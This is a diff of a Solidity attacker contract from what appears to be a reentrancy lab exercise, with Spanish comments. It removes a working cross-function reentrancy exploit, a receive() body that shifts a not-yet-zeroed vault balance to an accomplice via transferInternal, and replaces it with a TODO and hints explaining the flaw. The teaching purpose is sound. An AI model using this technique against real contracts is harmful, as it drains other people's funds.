@@ -17,18 +17,23 @@ contract CrossFunctionAttacker {
         accomplice = _accomplice;
     }
 
+    // Ya implementado: deposita y hace una primera retirada honesta.
     function attack() external payable {
         vault.deposit{value: msg.value}();
         vault.withdraw();
     }
 
-    /// @dev En vez de reentrar en withdraw(), mueve el balance (todavia sin
-    ///      poner a cero) a `accomplice` a través de una función que no hace
-    ///      ninguna llamada externa y por tanto no "parece" necesitar guardia.
+    // TODO: aquí vive el exploit. Reentrar en withdraw() otra vez también
+    // funcionaría (como en el Lab 01) -- pero hay una función hermana que
+    // comparte el mismo mapping `balances` y no hace ninguna llamada
+    // externa: no está protegida por el mismo motivo que withdraw() sí lo
+    // "parece" estar.
+    //
+    // Pista: consulta vault.balances(address(this)) -- ¿sigue reflejando tu
+    // depósito, aunque withdraw() ya te haya enviado el ETH? Si es así, hay
+    // una función que te permite mover ese balance a otra dirección antes
+    // de que withdraw() termine de ponerlo a 0.
     receive() external payable {
-        uint256 bal = vault.balances(address(this));
-        if (bal > 0) {
-            vault.transferInternal(accomplice, bal);
-        }
+        // completa aquí
     }
 }
